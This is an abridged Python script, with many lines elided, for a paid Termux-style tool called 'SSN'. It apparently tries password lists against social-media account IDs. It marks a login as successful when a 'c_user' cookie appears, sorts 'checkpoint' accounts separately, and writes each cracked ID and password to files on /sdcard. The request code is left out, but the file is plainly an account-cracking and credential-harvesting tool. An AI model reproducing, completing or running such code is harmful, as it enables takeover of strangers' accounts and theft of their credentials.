...
time.sleep(1.5)
print('[\033[1;32m✓\033[1;37m] UPDATED JUNE 18 2023 [^] ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
...
def FOFALWAYSONFIRE():
  ...
  print(f"""\x1b[1;97m
          ...
          ██       ██████  ██
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 Author    : MICHAEL COVENANT
 Github    : NOT YET
 Facebook  : JOHN WILLIAMS
 Tool Name : SSN
 Tool Type : \033[1;31m This tool is paid but i give my friends free\033[1;37m
...
\033[1;31m----------------------------------\033[1;37m
 ...
 Github    : -
 Facebook  : -
 Tool Name : \033[1;36mSSN \033[1;37m
 Tool Type : \033[1;31m-\033[1;37m
...
def Fof():
	clear()
	#ckx()
	print(f" [\033[1;32m1\033[1;37m] FILE FILE CLONE ")
	#print(f" [3] Gmail Cloning")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f' [\033[1;32m✓\033[1;37m] CHOOSE : ')
	if me in ["2", "02"]:
	...
	if me in ["1", "01","11","A","a"]:
		...
		print(f' METHOD 1 ')
		print(f' METHOD  [] 2')
		print(f' METHOD  [3] best,')
		mthd=input(f' [\033[1;32m✓\033[1;37m] CHOOSE : ')
		plist=[]
		try:
		...
		print(f' [\033[1;32m?\033[1;37m] Do You want to Show CP IDs (y/n): ')
		cx=input(f' [\033[1;32m✓\033[1;37m] Choose: ')
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [SSN] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                print(f'\r\r\033[1;32m [SSN\033[1;36m|\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/SSN|OK|M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [SSN•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/SsN•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/SSN|OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/lSSn•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/sSN•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
